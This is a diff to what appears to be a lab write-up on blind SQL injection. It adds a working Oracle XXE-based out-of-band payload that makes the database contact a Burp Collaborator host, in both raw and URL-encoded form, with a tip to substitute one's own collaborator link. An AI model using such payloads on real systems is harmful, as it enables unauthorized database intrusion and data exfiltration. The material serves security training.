@@ -32,6 +32,12 @@ Used **Burp Collaborator** to generate a unique subdomain:
 **Payload (Oracle XXE-based DNS lookup):**
 
 ```text
+'|| (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://hrcif7vu6e5v6jnupmof8b1uqlwck38s.oastify.com/"> %remote;]>'),'/l') FROM dual)--   
+```
+
+We have to encode above query and then forward it. Change your burp collaborator link with it.
+
+```text
 '||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>\<!DOCTYPE+root+[+\<!ENTITY+%25+remote+SYSTEM+"http%3a//hrcif7vu6e5v6jnupmof8b1uqlwck38s.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)--
 ```
 
